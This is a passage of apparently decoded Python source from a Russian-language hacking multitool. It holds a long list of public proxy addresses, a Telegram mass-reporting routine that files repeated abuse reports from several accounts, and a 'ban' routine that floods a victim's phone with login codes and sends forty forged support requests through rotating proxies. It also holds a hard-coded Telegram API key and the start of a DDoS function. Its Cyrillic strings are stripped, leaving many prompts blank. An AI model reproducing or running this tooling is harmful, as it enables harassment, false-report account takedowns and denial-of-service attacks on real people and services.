        '78.159.199.217:1080',  # DECODED BY https://github.com/MrN3lson-Script
        '67.206.213.202:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '14.161.48.4:4153', # DECODED BY https://github.com/MrN3lson-Script
        '119.10.179.33:5430', # DECODED BY https://github.com/MrN3lson-Script
        '109.238.222.1:4153', # DECODED BY https://github.com/MrN3lson-Script
        '103.232.64.226:4145', # DECODED BY https://github.com/MrN3lson-Script
        '183.88.212.247:1080',  # DECODED BY https://github.com/MrN3lson-Script
        '116.58.227.197:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '1.20.97.181:34102',  # DECODED BY https://github.com/MrN3lson-Script
        '103.47.93.214:1080', # DECODED BY https://github.com/MrN3lson-Script
        '89.25.23.211:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '185.43.249.132:39316', # DECODED BY https://github.com/MrN3lson-Script
        '188.255.209.149:1080', # DECODED BY https://github.com/MrN3lson-Script
        '178.216.2.229:1488',  # DECODED BY https://github.com/MrN3lson-Script
        '92.51.73.14:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '109.200.156.2:4153', # DECODED BY https://github.com/MrN3lson-Script
        '89.237.33.193:51549', # DECODED BY https://github.com/MrN3lson-Script
        '211.20.145.204:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '45.249.79.185:3629', # DECODED BY https://github.com/MrN3lson-Script
        '208.113.223.164:21829', # DECODED BY https://github.com/MrN3lson-Script
        '62.133.136.75:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '46.99.135.154:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '1.20.198.254:4153', # DECODED BY https://github.com/MrN3lson-Script
        '196.6.234.140:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '118.70.196.124:4145', # DECODED BY https://github.com/MrN3lson-Script
        '185.34.22.225:46169', # DECODED BY https://github.com/MrN3lson-Script
        '103.47.93.199:1080', # DECODED BY https://github.com/MrN3lson-Script
        '222.129.34.122:57114', # DECODED BY https://github.com/MrN3lson-Script
        '92.247.127.249:4153', # DECODED BY https://github.com/MrN3lson-Script
        '186.150.207.141:1080', # DECODED BY https://github.com/MrN3lson-Script
        '202.144.201.197:43870', # DECODED BY https://github.com/MrN3lson-Script
        '103.106.32.105:31110',  # DECODED BY https://github.com/MrN3lson-Script
        '200.85.137.46:4153', # DECODED BY https://github.com/MrN3lson-Script
        '116.58.254.9:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '101.51.141.122:4153', # DECODED BY https://github.com/MrN3lson-Script
        '83.69.125.126:4145', # DECODED BY https://github.com/MrN3lson-Script
        '187.62.88.9:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '122.54.134.176:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '170.0.203.11:1080',  # DECODED BY https://github.com/MrN3lson-Script
        '187.4.165.90:4153', # DECODED BY https://github.com/MrN3lson-Script
        '159.224.243.185:61303', # DECODED BY https://github.com/MrN3lson-Script
        '103.15.242.216:55492',  # DECODED BY https://github.com/MrN3lson-Script
        '187.216.81.183:37640', # DECODED BY https://github.com/MrN3lson-Script
        '176.197.100.134:3629',  # DECODED BY https://github.com/MrN3lson-Script
        '101.51.105.41:4145', # DECODED BY https://github.com/MrN3lson-Script
        '46.13.11.82:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '103.221.254.125:40781',  # DECODED BY https://github.com/MrN3lson-Script
        '177.139.130.157:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '1.10.189.133:50855',  # DECODED BY https://github.com/MrN3lson-Script
        '69.70.59.54:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '83.103.195.183:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '190.109.168.241:42732', # DECODED BY https://github.com/MrN3lson-Script
        '103.76.20.155:43818', # DECODED BY https://github.com/MrN3lson-Script
        '84.47.226.66:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '1.186.60.25:4153', # DECODED BY https://github.com/MrN3lson-Script
        '93.167.67.69:4145', # DECODED BY https://github.com/MrN3lson-Script
        '202.51.112.22:5430',  # DECODED BY https://github.com/MrN3lson-Script
        '213.6.204.153:42820', # DECODED BY https://github.com/MrN3lson-Script
        '184.178.172.14:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '217.171.62.42:4153', # DECODED BY https://github.com/MrN3lson-Script
        '121.13.229.213:61401', # DECODED BY https://github.com/MrN3lson-Script
        '101.255.140.101:1081', # DECODED BY https://github.com/MrN3lson-Script
        '78.189.64.42:4145', # DECODED BY https://github.com/MrN3lson-Script
        '187.11.232.71:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '190.184.201.146:32606',                            # DECODED BY https://github.com/MrN3lson-Script
        '195.34.221.81:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '200.29.176.174:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '103.68.35.162:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '194.135.97.126:4145', # DECODED BY https://github.com/MrN3lson-Script
        '167.172.123.221:9200', # DECODED BY https://github.com/MrN3lson-Script
        '200.218.242.89:4153', # DECODED BY https://github.com/MrN3lson-Script
        '190.7.141.66:40225', # DECODED BY https://github.com/MrN3lson-Script
        '186.103.154.235:4153', # DECODED BY https://github.com/MrN3lson-Script
        '118.174.196.250:4153', # DECODED BY https://github.com/MrN3lson-Script
        '213.136.89.190:52010', # DECODED BY https://github.com/MrN3lson-Script
        '217.25.221.60:4145', # DECODED BY https://github.com/MrN3lson-Script
        '50.192.195.69:39792', # DECODED BY https://github.com/MrN3lson-Script
        '180.211.162.114:44923',                            # DECODED BY https://github.com/MrN3lson-Script
        '179.1.1.11:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '41.162.94.52:30022', # DECODED BY https://github.com/MrN3lson-Script
        '103.211.11.13:52616', # DECODED BY https://github.com/MrN3lson-Script
        '103.209.65.12:6667', # DECODED BY https://github.com/MrN3lson-Script
        '101.51.121.29:4153', # DECODED BY https://github.com/MrN3lson-Script
        '190.13.82.242:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '103.240.33.185:8291', # DECODED BY https://github.com/MrN3lson-Script
        '202.51.100.33:5430', # DECODED BY https://github.com/MrN3lson-Script
        '201.220.128.92:3000',  # DECODED BY https://github.com/MrN3lson-Script
        '177.11.75.18:51327', # DECODED BY https://github.com/MrN3lson-Script
        '62.122.201.170:31871',  # DECODED BY https://github.com/MrN3lson-Script
        '79.164.171.32:50059', # DECODED BY https://github.com/MrN3lson-Script
        '202.124.46.97:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '79.132.205.34:61731', # DECODED BY https://github.com/MrN3lson-Script
        '217.29.18.206:4145', # DECODED BY https://github.com/MrN3lson-Script
        '222.217.68.17:35165', # DECODED BY https://github.com/MrN3lson-Script
        '105.29.95.34:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '103.226.143.254:1080', # DECODED BY https://github.com/MrN3lson-Script
        '119.82.251.250:31678',  # DECODED BY https://github.com/MrN3lson-Script
        '45.232.226.137:52104', # DECODED BY https://github.com/MrN3lson-Script
        '195.69.218.198:60687',  # DECODED BY https://github.com/MrN3lson-Script
        '155.133.83.161:58351',  # DECODED BY https://github.com/MrN3lson-Script
        '213.108.216.59:1080',  # DECODED BY https://github.com/MrN3lson-Script
        '178.165.91.245:3629', # DECODED BY https://github.com/MrN3lson-Script
        '124.158.150.205:4145', # DECODED BY https://github.com/MrN3lson-Script
        '36.72.118.156:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '177.93.79.18:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '103.47.94.97:1080',  # DECODED BY https://github.com/MrN3lson-Script
        '78.140.7.239:40009',  # DECODED BY https://github.com/MrN3lson-Script
        '187.19.150.221:80',  # DECODED BY https://github.com/MrN3lson-Script
        '103.192.156.171:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '36.67.27.189:49524',  # DECODED BY https://github.com/MrN3lson-Script
        '188.136.167.33:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '91.226.5.245:36604',  # DECODED BY https://github.com/MrN3lson-Script
        '78.90.81.184:42636',  # DECODED BY https://github.com/MrN3lson-Script
        '189.52.165.134:1080',  # DECODED BY https://github.com/MrN3lson-Script
        '81.183.253.34:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '95.154.104.147:31387',  # DECODED BY https://github.com/MrN3lson-Script
        '220.133.209.253:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '182.52.108.104:14153',  # DECODED BY https://github.com/MrN3lson-Script
        '195.93.173.24:9050',  # DECODED BY https://github.com/MrN3lson-Script
        '170.244.64.129:31476',  # DECODED BY https://github.com/MrN3lson-Script
        '117.102.124.234:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '190.210.3.210:1080',  # DECODED BY https://github.com/MrN3lson-Script
        '182.253.142.11:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '176.98.156.64:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '210.48.139.228:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '177.39.218.70:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '112.78.134.229:41517',  # DECODED BY https://github.com/MrN3lson-Script
        '119.46.2.245:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '103.212.94.253:41363',  # DECODED BY https://github.com/MrN3lson-Script
        '190.109.72.41:33633',  # DECODED BY https://github.com/MrN3lson-Script
        '103.94.133.94:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '190.151.94.2:56093',  # DECODED BY https://github.com/MrN3lson-Script
        '190.167.220.7:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '94.136.154.53:60030',  # DECODED BY https://github.com/MrN3lson-Script
        '103.206.253.120:4153' # DECODED BY https://github.com/MrN3lson-Script
    ] # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def proxies(): # DECODED BY https://github.com/MrN3lson-Script
        proxies = {'http': random.choice(proxies_list)} # DECODED BY https://github.com/MrN3lson-Script
        return proxies # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def load_accounts(): # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            with open(ACCOUNTS_FILE, 'r') as file: # DECODED BY https://github.com/MrN3lson-Script
                return json.load(file) # DECODED BY https://github.com/MrN3lson-Script
        except FileNotFoundError: # DECODED BY https://github.com/MrN3lson-Script
            return [] # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def save_accounts(accounts): # DECODED BY https://github.com/MrN3lson-Script
        with open(ACCOUNTS_FILE, 'w') as file: # DECODED BY https://github.com/MrN3lson-Script
            json.dump(accounts, file, indent=4) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def delete_session(phone_number): # DECODED BY https://github.com/MrN3lson-Script
        session_file = f"session_{phone_number}.session" # DECODED BY https://github.com/MrN3lson-Script
        if os.path.exists(session_file): # DECODED BY https://github.com/MrN3lson-Script
            os.remove(session_file) # DECODED BY https://github.com/MrN3lson-Script
            print(f" {session_file}  .") # DECODED BY https://github.com/MrN3lson-Script
        else: # DECODED BY https://github.com/MrN3lson-Script
            print(f" {session_file}  .") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        accounts = load_accounts() # DECODED BY https://github.com/MrN3lson-Script
        accounts = [acc for acc in accounts if acc['phone_number'] != phone_number] # DECODED BY https://github.com/MrN3lson-Script
        save_accounts(accounts) # DECODED BY https://github.com/MrN3lson-Script
        print(f" {phone_number}   .") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def add_account(): # DECODED BY https://github.com/MrN3lson-Script
        api_id = 21826549 # DECODED BY https://github.com/MrN3lson-Script
        api_hash = 'c1a19f792cfd9e397200d16c7e448160' # DECODED BY https://github.com/MrN3lson-Script
        phone_number = input("  : ") # DECODED BY https://github.com/MrN3lson-Script
        accounts = load_accounts() # DECODED BY https://github.com/MrN3lson-Script
        accounts.append({"api_id": api_id, "api_hash": api_hash, "phone_number": phone_number}) # DECODED BY https://github.com/MrN3lson-Script
        save_accounts(accounts) # DECODED BY https://github.com/MrN3lson-Script
        print("  !") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def choose_reason(): # DECODED BY https://github.com/MrN3lson-Script
        print("  :") # DECODED BY https://github.com/MrN3lson-Script
        print("1. ") # DECODED BY https://github.com/MrN3lson-Script
        print("2. ") # DECODED BY https://github.com/MrN3lson-Script
        print("3. ") # DECODED BY https://github.com/MrN3lson-Script
        print("4.  ") # DECODED BY https://github.com/MrN3lson-Script
        print("5. ") # DECODED BY https://github.com/MrN3lson-Script
        choice = input("  : ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        if choice == "1": # DECODED BY https://github.com/MrN3lson-Script
            return InputReportReasonSpam() # DECODED BY https://github.com/MrN3lson-Script
        elif choice == "2": # DECODED BY https://github.com/MrN3lson-Script
            return InputReportReasonViolence() # DECODED BY https://github.com/MrN3lson-Script
        elif choice == "3": # DECODED BY https://github.com/MrN3lson-Script
            return InputReportReasonPornography() # DECODED BY https://github.com/MrN3lson-Script
        elif choice == "4": # DECODED BY https://github.com/MrN3lson-Script
            return InputReportReasonChildAbuse() # DECODED BY https://github.com/MrN3lson-Script
        elif choice == "5": # DECODED BY https://github.com/MrN3lson-Script
            return InputReportReasonOther() # DECODED BY https://github.com/MrN3lson-Script
        else: # DECODED BY https://github.com/MrN3lson-Script
            print(" .  .") # DECODED BY https://github.com/MrN3lson-Script
            return choose_reason() # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    async def authenticate_client(client, phone_number): # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            print(f"   {phone_number}...") # DECODED BY https://github.com/MrN3lson-Script
            if not client.is_connected(): # DECODED BY https://github.com/MrN3lson-Script
                await client.connect() # DECODED BY https://github.com/MrN3lson-Script
            if not await client.is_user_authorized(): # DECODED BY https://github.com/MrN3lson-Script
                print(f"  {phone_number}...") # DECODED BY https://github.com/MrN3lson-Script
                await client.send_code_request(phone_number) # DECODED BY https://github.com/MrN3lson-Script
                code = input(f"   {phone_number}: ") # DECODED BY https://github.com/MrN3lson-Script
                await client.sign_in(phone_number, code) # DECODED BY https://github.com/MrN3lson-Script
                try: # DECODED BY https://github.com/MrN3lson-Script
                    await client.sign_in(password=input("     ( ): ")) # DECODED BY https://github.com/MrN3lson-Script
                except Exception: # DECODED BY https://github.com/MrN3lson-Script
                    pass # DECODED BY https://github.com/MrN3lson-Script
            print(f" {phone_number}  .") # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            print(f"   {phone_number}: {e}") # DECODED BY https://github.com/MrN3lson-Script
        finally: # DECODED BY https://github.com/MrN3lson-Script
            if not client.is_connected(): # DECODED BY https://github.com/MrN3lson-Script
                print(f":  {phone_number}  .") # DECODED BY https://github.com/MrN3lson-Script
                await client.disconnect() # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    async def send_message_report(client, message_link, reason): # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            if not client.is_connected(): # DECODED BY https://github.com/MrN3lson-Script
                print(" . ...") # DECODED BY https://github.com/MrN3lson-Script
                await client.connect() # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            parts = message_link.split('/') # DECODED BY https://github.com/MrN3lson-Script
            chat_username = parts[-2] # DECODED BY https://github.com/MrN3lson-Script
            message_id = int(parts[-1]) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            chat = await client.get_entity(chat_username) # DECODED BY https://github.com/MrN3lson-Script
            for i in range(4): # DECODED BY https://github.com/MrN3lson-Script
                await client(ReportPeerRequest( # DECODED BY https://github.com/MrN3lson-Script
                    peer=chat, # DECODED BY https://github.com/MrN3lson-Script
                    reason=reason, # DECODED BY https://github.com/MrN3lson-Script
                    message="" # DECODED BY https://github.com/MrN3lson-Script
                )) # DECODED BY https://github.com/MrN3lson-Script
                print(f"  {client.session.filename}   {message_id}  .") # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            print(f"     {client.session.filename}: {e}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    async def main(): # DECODED BY https://github.com/MrN3lson-Script
        print("""        
            :
            1.  
            2.   
            3.    
            4.  
            5. 
            """)
        while True: # DECODED BY https://github.com/MrN3lson-Script
            choice = input("  : ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            if choice == "1": # DECODED BY https://github.com/MrN3lson-Script
                accounts = load_accounts() # DECODED BY https://github.com/MrN3lson-Script
                if not accounts: # DECODED BY https://github.com/MrN3lson-Script
                    print("     !") # DECODED BY https://github.com/MrN3lson-Script
                    continue # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                message_link = input("    (, https://t.me/username/123): ") # DECODED BY https://github.com/MrN3lson-Script
                reason = choose_reason() # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                for account in accounts: # DECODED BY https://github.com/MrN3lson-Script
                    print(f"\
  {account['phone_number']}...") # DECODED BY https://github.com/MrN3lson-Script
                    client = TelegramClient(f"session_{account['phone_number']}", account["api_id"], account["api_hash"]) # DECODED BY https://github.com/MrN3lson-Script
                    async with client: # DECODED BY https://github.com/MrN3lson-Script
                        try: # DECODED BY https://github.com/MrN3lson-Script
                            await client.start(phone=account["phone_number"]) # DECODED BY https://github.com/MrN3lson-Script
                            await send_message_report(client, message_link, reason) # DECODED BY https://github.com/MrN3lson-Script
                        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
                            print(f"     {account['phone_number']}: {e}") # DECODED BY https://github.com/MrN3lson-Script
            elif choice == "2": # DECODED BY https://github.com/MrN3lson-Script
                add_account() # DECODED BY https://github.com/MrN3lson-Script
            elif choice == "3": # DECODED BY https://github.com/MrN3lson-Script
                phone_number = input("     : ") # DECODED BY https://github.com/MrN3lson-Script
                delete_session(phone_number) # DECODED BY https://github.com/MrN3lson-Script
            elif choice == "4": # DECODED BY https://github.com/MrN3lson-Script
                phone = input("  : ") # DECODED BY https://github.com/MrN3lson-Script
                username = input("  : ") # DECODED BY https://github.com/MrN3lson-Script
                user_agent = {'User-Agent': user_agents()} # DECODED BY https://github.com/MrN3lson-Script
                random_text = ''.join(random.choice(string.ascii_letters) for _ in range(8)) # DECODED BY https://github.com/MrN3lson-Script
                support_text = f""",   Telegram.

 ,            . , ,          .     .

   : {phone}
  : {username}

     ."""
 # DECODED BY https://github.com/MrN3lson-Script
                await auth_spam(phone) # DECODED BY https://github.com/MrN3lson-Script
                site_auth_spam(phone) # DECODED BY https://github.com/MrN3lson-Script
                time.sleep(1) # DECODED BY https://github.com/MrN3lson-Script
                 # DECODED BY https://github.com/MrN3lson-Script
                for _ in range(40): # DECODED BY https://github.com/MrN3lson-Script
                    try: # DECODED BY https://github.com/MrN3lson-Script
                        requests.get( # DECODED BY https://github.com/MrN3lson-Script
                            f"https://telegram.org/support?message={support_text}&email={random_text}@gmail.com&phone={phone}", # DECODED BY https://github.com/MrN3lson-Script
                            headers=user_agent, # DECODED BY https://github.com/MrN3lson-Script
                            proxies=proxies() # DECODED BY https://github.com/MrN3lson-Script
                        ) # DECODED BY https://github.com/MrN3lson-Script
                         # DECODED BY https://github.com/MrN3lson-Script
                    except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
                        print("error") # DECODED BY https://github.com/MrN3lson-Script
                         # DECODED BY https://github.com/MrN3lson-Script
                input("\
 ENTER  ...") # DECODED BY https://github.com/MrN3lson-Script
                await main() # DECODED BY https://github.com/MrN3lson-Script
            elif choice == "5": # DECODED BY https://github.com/MrN3lson-Script
                print("  .") # DECODED BY https://github.com/MrN3lson-Script
                break # DECODED BY https://github.com/MrN3lson-Script
            else: # DECODED BY https://github.com/MrN3lson-Script
                print(" .  .") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    asyncio.run(main()) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
def rabota_c_url(): # DECODED BY https://github.com/MrN3lson-Script
    def check_link_safety(url): # DECODED BY https://github.com/MrN3lson-Script
        trusted_domains = [ # DECODED BY https://github.com/MrN3lson-Script
            'google.com', 'youtube.com', 'vk.com', 'ok.ru', 'facebook.com',  # DECODED BY https://github.com/MrN3lson-Script
            'instagram.com', 'twitter.com', 'telegram.org', 'trusted-domain.com', # DECODED BY https://github.com/MrN3lson-Script
            'yandex.ru', 'yandex.com', 'ya.ru' # DECODED BY https://github.com/MrN3lson-Script
        ] # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        parsed_url = urlparse(url) # DECODED BY https://github.com/MrN3lson-Script
        if any(trusted in parsed_url.netloc for trusted in trusted_domains): # DECODED BY https://github.com/MrN3lson-Script
            print(colored(f"{url}      .", "green")) # DECODED BY https://github.com/MrN3lson-Script
            return # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            response = requests.get(url, allow_redirects=True) # DECODED BY https://github.com/MrN3lson-Script
            if response.status_code == 200: # DECODED BY https://github.com/MrN3lson-Script
                suspicious_found = False # DECODED BY https://github.com/MrN3lson-Script
                final_url = response.url # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                if final_url != url: # DECODED BY https://github.com/MrN3lson-Script
                    print(colored(f"!     URL: {final_url}", "yellow")) # DECODED BY https://github.com/MrN3lson-Script
                    suspicious_found = True # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                parsed_url = urlparse(final_url) # DECODED BY https://github.com/MrN3lson-Script
                query_params = parse_qs(parsed_url.query) # DECODED BY https://github.com/MrN3lson-Script
                suspicious_params = ['token', 'session', 'id', 'key', 'auth', 'login', 'password', 'email', 'user', 'account'] # DECODED BY https://github.com/MrN3lson-Script
                for param in suspicious_params: # DECODED BY https://github.com/MrN3lson-Script
                    if param in query_params: # DECODED BY https://github.com/MrN3lson-Script
                        print(colored(f"!     URL: {param}", "yellow")) # DECODED BY https://github.com/MrN3lson-Script
                        suspicious_found = True # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                content = response.text.lower() # DECODED BY https://github.com/MrN3lson-Script
                suspicious_keywords = ['track', 'collect', 'logger', 'steal', 'phishing', 'malware', 'hack', 'exploit'] # DECODED BY https://github.com/MrN3lson-Script
                for keyword in suspicious_keywords: # DECODED BY https://github.com/MrN3lson-Script
                    if keyword in content: # DECODED BY https://github.com/MrN3lson-Script
                        print(colored(f"!      : {keyword}", "yellow")) # DECODED BY https://github.com/MrN3lson-Script
                        suspicious_found = True # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                soup = BeautifulSoup(response.text, 'html.parser') # DECODED BY https://github.com/MrN3lson-Script
                scripts = soup.find_all('script') # DECODED BY https://github.com/MrN3lson-Script
                if scripts: # DECODED BY https://github.com/MrN3lson-Script
                    for script in scripts: # DECODED BY https://github.com/MrN3lson-Script
                        src = script.get('src', '') # DECODED BY https://github.com/MrN3lson-Script
                        if src and not any(trusted in src for trusted in ['telegram.org', 'trusted-domain.com']): # DECODED BY https://github.com/MrN3lson-Script
                            print(colored(f"!   : {src}", "yellow")) # DECODED BY https://github.com/MrN3lson-Script
                            suspicious_found = True # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                forms = soup.find_all('form') # DECODED BY https://github.com/MrN3lson-Script
                if forms: # DECODED BY https://github.com/MrN3lson-Script
                    print(colored(f"!     ({len(forms)} ).", "yellow")) # DECODED BY https://github.com/MrN3lson-Script
                    suspicious_found = True # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                external_resources = set() # DECODED BY https://github.com/MrN3lson-Script
                for tag in soup.find_all(['script', 'img', 'link', 'iframe']): # DECODED BY https://github.com/MrN3lson-Script
                    src = tag.get('src') or tag.get('href') # DECODED BY https://github.com/MrN3lson-Script
                    if src and not src.startswith(('data:', 'http://', 'https://')): # DECODED BY https://github.com/MrN3lson-Script
                        if not any(trusted in src for trusted in ['telegram.org', 'trusted-domain.com']): # DECODED BY https://github.com/MrN3lson-Script
                            external_resources.add(src) # DECODED BY https://github.com/MrN3lson-Script
                if external_resources: # DECODED BY https://github.com/MrN3lson-Script
                    print(colored(f"!   : {', '.join(external_resources)}", "yellow")) # DECODED BY https://github.com/MrN3lson-Script
                    suspicious_found = True # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                if suspicious_found: # DECODED BY https://github.com/MrN3lson-Script
                    print(colored(f"{url}    !", "red")) # DECODED BY https://github.com/MrN3lson-Script
                else: # DECODED BY https://github.com/MrN3lson-Script
                    print(colored(f"{url}  .", "green")) # DECODED BY https://github.com/MrN3lson-Script
            else: # DECODED BY https://github.com/MrN3lson-Script
                print(colored(f"{url}   .", "red")) # DECODED BY https://github.com/MrN3lson-Script
        except requests.exceptions.RequestException as e: # DECODED BY https://github.com/MrN3lson-Script
            print(f"    {url}: {str(e)}") # DECODED BY https://github.com/MrN3lson-Script
    HOURS = datetime.now().strftime("%H") # DECODED BY https://github.com/MrN3lson-Script
    MIN = datetime.now().strftime("%M") # DECODED BY https://github.com/MrN3lson-Script
    SEC = datetime.now().strftime("%S") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def send_notification(log_bot, log_rec, message):  # DECODED BY https://github.com/MrN3lson-Script
        url = f'https://api.telegram.org/bot{log_bot}/sendMessage?chat_id={log_rec}&text={message}' # DECODED BY https://github.com/MrN3lson-Script
        response = requests.post(url) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def check_for_logger(url): # DECODED BY https://github.com/MrN3lson-Script
        suspicious_found = False # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            response = requests.get(url, allow_redirects=True) # DECODED BY https://github.com/MrN3lson-Script
            final_url = response.url # DECODED BY https://github.com/MrN3lson-Script
            if final_url != url: # DECODED BY https://github.com/MrN3lson-Script
                print(colored(f"!     URL: {final_url}", "yellow")) # DECODED BY https://github.com/MrN3lson-Script
                suspicious_found = True # DECODED BY https://github.com/MrN3lson-Script
            parsed_url = urlparse(final_url) # DECODED BY https://github.com/MrN3lson-Script
            query_params = parse_qs(parsed_url.query) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            suspicious_params = ['token', 'session', 'id', 'key', 'auth', 'login', 'password'] # DECODED BY https://github.com/MrN3lson-Script
            for param in suspicious_params: # DECODED BY https://github.com/MrN3lson-Script
                if param in query_params: # DECODED BY https://github.com/MrN3lson-Script
                    print(colored(f"!     URL: {param}", "yellow")) # DECODED BY https://github.com/MrN3lson-Script
                    suspicious_found = True # DECODED BY https://github.com/MrN3lson-Script
            suspicious_keywords = ['track', 'collect', 'logger', 'steal'] # DECODED BY https://github.com/MrN3lson-Script
            content = response.text.lower() # DECODED BY https://github.com/MrN3lson-Script
            for keyword in suspicious_keywords: # DECODED BY https://github.com/MrN3lson-Script
                if keyword in content: # DECODED BY https://github.com/MrN3lson-Script
                    print(colored(f"!      : {keyword}", "yellow")) # DECODED BY https://github.com/MrN3lson-Script
                    suspicious_found = True # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            if suspicious_found: # DECODED BY https://github.com/MrN3lson-Script
                print(colored("  !", "red")) # DECODED BY https://github.com/MrN3lson-Script
            else: # DECODED BY https://github.com/MrN3lson-Script
                print(colored("   .", "green")) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        except requests.exceptions.RequestException as e: # DECODED BY https://github.com/MrN3lson-Script
            print(f"   {url}: {str(e)}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def dos(target): # DECODED BY https://github.com/MrN3lson-Script
        headers = { # DECODED BY https://github.com/MrN3lson-Script
            'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);', # DECODED BY https://github.com/MrN3lson-Script
        } # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            res = requests.get(target, headers=headers) # DECODED BY https://github.com/MrN3lson-Script
        except requests.exceptions.ConnectionError: # DECODED BY https://github.com/MrN3lson-Script
            print("[+] Connection error!") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def run_ddos(url, threads): # DECODED BY https://github.com/MrN3lson-Script
        if not url.startswith("http"): # DECODED BY https://github.com/MrN3lson-Script
            print("URL    http  https!") # DECODED BY https://github.com/MrN3lson-Script
            return # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        if not url.__contains__("."): # DECODED BY https://github.com/MrN3lson-Script
            print(" !") # DECODED BY https://github.com/MrN3lson-Script
